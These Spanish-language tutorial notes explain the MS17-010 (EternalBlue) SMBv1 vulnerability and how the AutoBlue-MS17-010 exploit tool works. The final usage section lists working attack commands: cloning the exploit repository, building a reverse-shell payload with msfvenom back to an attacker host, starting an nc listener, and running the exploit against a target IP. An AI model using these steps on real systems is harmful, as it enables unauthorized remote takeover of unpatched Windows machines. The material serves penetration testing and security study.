- El script **AutoBlue-MS17-010** es una herramienta de explotación automatizada diseñada para aprovechar la vulnerabilidad **MS17-010** en sistemas Windows. Esta vulnerabilidad, también conocida como **EternalBlue**, afecta el protocolo **SMBv1 (Server Message Block versión 1)** y fue una de las vulnerabilidades utilizadas por el exploit **EternalBlue** filtrado por el grupo Shadow Brokers en 2017. Esta vulnerabilidad fue la base de los ciberataques masivos como **WannaCry** y **NotPetya**.
- ### Descripción General de MS17-010

	- **MS17-010** es una vulnerabilidad crítica que permite a un atacante ejecutar código de manera remota en un sistema vulnerable. Afecta a múltiples versiones de Windows, como Windows 7, Windows Server 2008, y otras versiones más antiguas que utilizan SMBv1 sin el parche adecuado.

	- La explotación de esta vulnerabilidad permite la ejecución remota de código (RCE, por sus siglas en inglés) en la máquina de destino, sin requerir credenciales ni interacción del usuario. Esto es posible debido a una falla en la forma en que SMBv1 maneja las solicitudes especialmente diseñadas.
- ### Qué es AutoBlue-MS17-010

	- **AutoBlue-MS17-010** es una herramienta escrita en Python que automatiza el proceso de explotación de esta vulnerabilidad. Fue creada para facilitar la ejecución de EternalBlue, especialmente para usuarios de pruebas de penetración o investigadores de seguridad. Su propósito principal es:
		
		1. **Detectar si un sistema es vulnerable a MS17-010**.
		2. **Explotar la vulnerabilidad** para obtener acceso remoto.
		3. **Generar una shell inversa** en el sistema vulnerable.
- ### Componentes Principales del Script

	- AutoBlue-MS17-010 combina varias herramientas y scripts para llevar a cabo un ataque exitoso, incluyendo:
		
		1. **Escaneo de Vulnerabilidad**: Antes de lanzar el exploit, el script realiza un escaneo de los hosts objetivo para verificar si son vulnerables a MS17-010. Esto se hace enviando paquetes SMB personalizados y analizando las respuestas.
		    
		2. **Explotación con EternalBlue**: Una vez identificado un sistema vulnerable, el script lanza el exploit EternalBlue. Esto involucra el envío de una carga maliciosa a través del protocolo SMB que aprovecha el desbordamiento de búfer en SMBv1 para ejecutar código en el sistema remoto. Esto permite al atacante obtener acceso no autorizado al sistema objetivo.
		
		3. **Payload (Carga Maliciosa)**: El script permite generar un payload (carga útil) que se ejecutará en el sistema comprometido. Generalmente, se utiliza un payload de tipo _shell inversa_, que permite al atacante obtener acceso interactivo en la máquina víctima. AutoBlue-MS17-010 permite personalizar la carga, eligiendo entre varios tipos de payloads, como Meterpreter de Metasploit.
		    
		4. **Configuración del Listener**: Una vez que el payload está listo, el script configura un listener en la máquina atacante. Este listener está preparado para recibir la conexión inversa desde la máquina comprometida, lo que da al atacante acceso remoto a través de la shell generada.
		    
		5. **Explotación Automatizada**: AutoBlue-MS17-010 combina todas estas funcionalidades en un solo flujo de trabajo automatizado. Así, un usuario puede seleccionar un host, comprobar si es vulnerable y, en caso afirmativo, lanzar el exploit y obtener acceso de manera sencilla.
- ### Uso Básico de AutoBlue-MS17-010

	- El uso básico de AutoBlue-MS17-010 generalmente involucra los siguientes pasos:
		
		1. **Clonar el repositorio**:
		    		    
		    `git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git cd AutoBlue-MS17-010`
		    
		2. **Ejecutar el script**: AutoBlue tiene scripts específicos tanto para sistemas de 32 bits como de 64 bits. Puedes ejecutar el script para verificar la vulnerabilidad y explotar el sistema. Por ejemplo, para un sistema de 64 bits:
		    		    
		    `python eternalblue_exploit7.py 192.168.1.10 shellcode/sc_x64.bin`
		    
		    Donde `192.168.1.10` es la IP de la máquina objetivo y `sc_x64.bin` es el archivo del payload en formato de shellcode.
		    
		3. **Generar el payload**: Antes de ejecutar el exploit, el script también permite crear un payload personalizado. Puedes usar Metasploit para generar el payload:
		    
		    		    
		    `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw > sc_x64.bin`
		    
		    Aquí, `LHOST` es la dirección IP de la máquina atacante, y `LPORT` es el puerto en el que el listener estará esperando la conexión.
		    
		4. **Iniciar el Listener**: En la máquina atacante, inicia el listener que esperará la conexión de la shell inversa:
		    		    
		    `nc -lvnp 4444`
		    
		5. **Ejecutar el Exploit**: Ejecuta el script para lanzar el exploit y establecer la conexión remota.
- 